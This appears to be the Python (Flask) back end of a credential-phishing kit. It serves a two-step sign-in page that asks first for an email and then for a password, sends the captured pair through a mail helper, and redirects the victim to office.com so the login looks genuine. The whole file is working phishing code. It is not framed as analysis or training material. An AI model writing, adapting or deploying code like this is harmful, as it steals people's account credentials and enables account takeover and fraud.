from flask import Flask, render_template, request, redirect
import sendmail

app = Flask(__name__)
name = None
passwd = None
mailer = sendmail.Mailer()

@app.route("/",methods=['POST','GET'])
def home():
    return render_template("index.html")

@app.route("/auth",methods=['POST','GET'])
def auth():
    global name
    output = request.form.to_dict()
    name = output["loginfmnt"]
    if name:
        return render_template("index2.html",email=name)
    else:
        return render_template("index.html",name=None)

@app.route("/success",methods=['POST','GET'])
def success():
    global passwd
    output = request.form.to_dict()
    passwd = output["passwrd"]
    if passwd:
        mailer.send(name,passwd)
        return redirect("https://www.office.com/", code=302)  
    else:
        return render_template("index2.html",passwd=None,email=name)

if __name__ == "__main__":
    app.run()